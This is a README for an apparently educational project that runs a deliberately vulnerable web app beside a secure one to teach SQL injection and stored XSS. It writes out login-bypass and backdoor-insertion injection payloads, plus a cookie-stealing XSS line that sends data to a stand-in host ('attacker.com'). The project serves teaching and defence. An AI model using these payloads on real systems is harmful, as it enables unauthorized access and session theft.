# Communication_LTD Cybersecurity Project - Quick Start Guide

This project demonstrates **secure vs. vulnerable** web development for a telecom company using two identical Next.js applications.

## Quick Start (5 minutes)

### Prerequisites

- Node.js 18+

### 1. Install Dependencies

```bash
# From project root
npm install
```

### 2. Initialize Database

```bash
npm run db:init
```

This creates SQLite database at `data/communication_ltd.db`

### 3. Start Both Applications

```bash
npm run dev
```

**Two applications will run simultaneously:**

- **Vulnerable Version**: http://localhost:3000 (Port 3000)
- **Secure Version**: http://localhost:3001 (Port 3001)

---

## Testing the Vulnerable Version (Port 3000)

The vulnerable version demonstrates common web attack vectors. These examples show how attackers exploit poor coding practices.

### Test 1: SQL Injection - Login Bypass

**Via curl:**

```bash
# Bypass login with SQL injection
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin\u0027 --", "password": "anything"}'

# Expected: VULNERABLE - Returns admin user regardless of password
# This works because the query becomes: SELECT * FROM Users WHERE username = 'admin' --' AND password = ...
# The '--' comments out the password check, bypassing authentication
```

**Via Browser:**

1. Navigate to http://localhost:3000
2. On login page, enter username: `admin' --`
3. Enter any password
4. **VULNERABLE**: Gets logged in as admin without correct password

---

### Test 2: SQL Injection - Registration

**Via curl:**

```bash
# SQL injection in registration to create admin account
curl -X POST http://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "hacker\u0027); INSERT INTO Users (username, email, password_hash) VALUES (\u0027backdoor\u0027, \u0027backdoor@evil.com\u0027, \u0027admin123\u0027); --",
    "email": "hacker@evil.com",
    "password": "Test@1234",
    "confirmPassword": "Test@1234"
  }'

# Expected: VULNERABLE - Database contains both the malicious entry and the injected record
```

---

### Test 3: Stored XSS - Customer Name Field

**Via curl:**

```bash
# First, login to get a valid session (or use test account)
# Then add customer with XSS payload in name field

curl -X POST http://localhost:3000/api/customers/add \
  -H "Content-Type: application/json" \
  -d '{
    "firstName": "<img src=x onerror=\"alert(\u0027XSS ATTACK: Your session cookie: \u0027 + document.cookie)\">",
    "lastName": "Customer",
    "email": "test@example.com",
    "phone": "555-0123",
    "sector": "IT",
    "subscriptionPackage": "premium"
  }'

# Expected: VULNERABLE - Payload stored in database as-is
```

**Via Browser:**

1. Register and login to http://localhost:3000
2. Navigate to "Add Customer"
3. In "First Name" field, enter: `<img src=x onerror="alert('XSS Attack Successful!');">`
4. Submit form
5. **VULNERABLE**: JavaScript executes immediately, alert pops up
6. Refresh page: Alert pops up again (payload persists in database - "Stored XSS")

**Attack Impact:**

- Attacker injects: `<img src=x onerror="fetch('https://attacker.com/steal?cookie=' + document.cookie)">`
- Steals session cookies from every user viewing that customer
- Complete account takeover possible

---

## Testing the Secure Version (Port 3001)

The secure version implements proper defenses against the same attacks.

### Test 1: SQL Injection - Login is Protected

**Via curl:**

```bash
# Same injection attempt as vulnerable version
curl -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin\u0027 --", "password": "anything"}'

# Expected: SECURE - Returns 401 Unauthorized (no user found)
# Secure approach: Uses parameterized queries
# SQL injection string is treated as literal data, not code
```

**Via Browser:**

1. Navigate to http://localhost:3001
2. On login page, enter username: `admin' --`
3. Enter any password
4. **SECURE**: Returns "Invalid credentials"
5. Cannot bypass authentication with SQL injection

---

### Test 2: SQL Injection - Registration is Protected

**Via curl:**

```bash
# Same injection attempt as vulnerable version
curl -X POST http://localhost:3001/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "hacker\u0027); INSERT INTO Users (username, email, password_hash) VALUES (\u0027backdoor\u0027, \u0027backdoor@evil.com\u0027, \u0027admin123\u0027); --",
    "email": "hacker@evil.com",
    "password": "Test@1234",
    "confirmPassword": "Test@1234"
  }'

# Expected: SECURE - Returns error for invalid username
# The injection attempt is treated as a literal username string
# Only alphanumeric characters and basic symbols are allowed
```

---

### Test 3: Stored XSS - Customer Name is Sanitized

**Via curl:**

```bash
# Same XSS payload as vulnerable version
curl -X POST http://localhost:3001/api/customers/add \
  -H "Content-Type: application/json" \
  -d '{
    "firstName": "<img src=x onerror=\"alert(\u0027XSS Attack\u0027)\">",
    "lastName": "Customer",
    "email": "test@example.com",
    "phone": "555-0123",
    "sector": "IT",
    "subscriptionPackage": "premium"
  }'

# Expected: SECURE - Payload is stored but rendered as literal text
# When displayed: shows "<img src=x onerror=...>" as plain text, no script execution
```

**Via Browser:**

1. Register and login to http://localhost:3001
2. Navigate to "Add Customer"
3. In "First Name" field, enter: `<img src=x onerror="alert('XSS Attack');">`
4. Submit form
5. **SECURE**: No alert - page displays safely
6. View customer - renders as text: `<img src=x onerror="alert('XSS Attack');">` (visible, not executed)

---

## Security Vulnerabilities Covered

| Vulnerability                  | Vulnerable Version              | Secure Version                               |
| ------------------------------ | ------------------------------- | -------------------------------------------- |
| **SQL Injection**              | String concatenation in queries | Parameterized queries (SQLite ?) binding)    |
| **Cross-Site Scripting (XSS)** | Raw HTML stored & displayed     | HTML entity encoding on display              |
| **Password Storage**           | Plain text demonstration        | Bcryptjs hashing (12 salt rounds)            |
| **Authentication Bypass**      | No rate limiting                | Rate limiting (3 attempts per 15 min)        |
| **Account Lockout**            | No lockout mechanism            | Automatic 15-minute lockout after 3 failures |
| **Password Reuse**             | Allowed immediately             | Last 3 passwords remembered and checked      |

---

## Database Schema

### Users Table

```sql
id              INTEGER PRIMARY KEY
username        TEXT UNIQUE NOT NULL
email           TEXT UNIQUE NOT NULL
password_hash   TEXT NOT NULL
salt            TEXT
password_changed_date  DATETIME
login_attempts  INTEGER DEFAULT 0
locked_until    DATETIME
password_history TEXT -- JSON array of previous hashes
created_date    DATETIME DEFAULT CURRENT_TIMESTAMP
```

### Customers Table

```sql
id                  INTEGER PRIMARY KEY
user_id             INTEGER NOT NULL (FK -> Users.id)
first_name          TEXT NOT NULL
last_name           TEXT NOT NULL
phone               TEXT
email               TEXT
sector              TEXT
subscription_package TEXT
created_date        DATETIME DEFAULT CURRENT_TIMESTAMP
updated_date        DATETIME DEFAULT CURRENT_TIMESTAMP
```

### PasswordResetTokens Table

```sql
id          INTEGER PRIMARY KEY
user_id     INTEGER NOT NULL (FK -> Users.id)
token_hash  TEXT NOT NULL
expiry_date DATETIME NOT NULL
used        INTEGER DEFAULT 0
created_date DATETIME DEFAULT CURRENT_TIMESTAMP
```

---

## Key Security Principles

1. **Parameterized Queries**: Treats user input as data, not executable code
2. **Password Hashing**: Bcryptjs with 12 salt rounds (OWASP recommended)
3. **Rate Limiting**: Max 3 failed login attempts per 15-minute window
4. **HTML Entity Encoding**: Converts dangerous characters to safe display text
5. **Generic Error Messages**: Won't reveal if username/email exists in system

---

## Architecture Overview

```
┌─ /pages/api/auth/ ─────────────┐
│  ├─ login.ts                    │  SQL Injection Protection
│  ├─ register.ts                 │  Parameterized Queries
│  └─ change-password.ts          │  Input Validation
├─ /pages/api/customers/         │
│  ├─ add.ts (XSS Demo)           │  XSS Prevention
│  └─ get.ts                      │  HTML Encoding
├─ /lib/                          │
│  ├─ auth.ts (Bcryptjs hashing)  │
│  └─ db.ts (SQLite connection)   │
└─ /database/                     │
   ├─ init-db.ts                  │
   └─ schema.sqlite.sql (SQLite)  │
```

---

## Common Test Accounts

After running `npm run db:init`, use these credentials to login:

**Standard User:**

- Username: `david`
- Email: `david@testemail.com`
- Password: `SecurePass@123`

**Admin User (if available):**

- Username: `admin`
- Email: `admin@testemail.com`
- Password: `AdminPass@123`

---

## Troubleshooting

**Database won't initialize:**

```bash
# Delete existing database and retry
rm -r data/
npm run db:init
```

**Port 3000/3001 already in use:**

```bash
# Find and kill process using port 3000
# macOS/Linux:
lsof -ti:3000 | xargs kill -9

# Windows:
netstat -ano | findstr :3000
taskkill /PID <PID> /F
```

**Dependencies not installed:**

```bash
rm -rf node_modules package-lock.json
npm install
```

---

## For Instructors

**Educational Use Cases:**

1. **Live Demonstration** (~30 min):
   - Show login SQL injection on vulnerable version
   - Same test on secure version shows it fails
   - Discuss why parameterized queries work

2. **Hands-On Lab** (~1-2 hours):
   - Students attempt each attack on vulnerable version
   - Then test same attacks on secure version
   - Modify one of the APIs to implement fix
   - Verify attack no longer works

3. **Code Review Exercise**:
   - Compare `communication-ltd-vulnerable/pages/api/` vs `communication-ltd-secure/pages/api/`
   - Identify differences in query construction
   - Discuss security trade-offs

---

## Additional Resources

- [OWASP Top 10 Web Application Security Risks](https://owasp.org/www-project-top-ten/)
- [Bcryptjs Documentation](https://github.com/dcodeIO/bcrypt.js)
- [SQLite Prepared Statements](https://www.sqlite.org/appfunc.html)
- [HTML Entity Reference](https://html.spec.whatwg.org/multipage/named-characters.html)
